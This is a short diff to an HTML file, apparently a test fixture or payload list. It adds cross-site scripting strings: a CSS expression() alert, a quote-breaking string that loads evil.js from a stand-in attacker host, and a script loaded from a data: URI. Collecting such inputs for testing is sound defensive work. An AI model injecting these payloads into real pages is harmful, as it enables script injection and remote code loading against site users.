@@ -1,1 +1,4 @@
 <html><body><script>alert(1)</script></body></html>
+<DIV STYLE="width: expression(alert('XSS'));">
+  "/>'><script src=https://attacker-website.com/evil.js></script>
+"/>'><script src=data:text/javascript,alert(1337)></script>
